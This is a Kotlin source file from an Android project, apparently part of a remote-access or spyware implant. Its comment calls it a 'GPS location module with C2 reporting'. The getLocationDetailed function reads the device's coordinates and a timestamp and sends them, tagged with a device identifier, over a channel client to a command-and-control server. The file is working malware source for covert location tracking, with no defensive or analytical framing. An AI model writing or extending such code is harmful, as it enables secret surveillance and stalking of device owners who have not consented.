// ============================================================
// FILE: android/app/src/main/java/com/xrc/sensors/Location.kt
// ============================================================
package com.xrc.sensors

import android.Manifest
import android.content.Context
import com.xrc.comms.ChannelClient
import com.xrc.comms.Message
import com.xrc.comms.Protocol
import com.xrc.core.crypto.Identity

/**
 * Location — GPS location module with C2 reporting.
 */
class Location(
    private val context: Context,
    private val channelClient: ChannelClient
) {
    private val tracker = LocationTracker(context)

    fun getLocation(): Pair<Double, Double>? = tracker.getLocation()

    fun getLocationDetailed(): Map<String, Any>? {
        val loc = getLocation() ?: return null
        val result = mapOf(
            "lat" to loc.first,
            "lon" to loc.second,
            "timestamp" to System.currentTimeMillis()
        )

        val deviceId = Identity.getDeviceId(context)
        val msg = Message(
            type = Protocol.TYPE_SENSOR_DATA,
            id = "loc_${System.currentTimeMillis()}",
            device_id = deviceId,
            payload = Protocol.json.encodeToString(
                mapOf("type" to "location", "data" to result)
            )
        )
        channelClient.send(msg)

        return result
    }

    fun hasPermission(): Boolean =
        context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
}
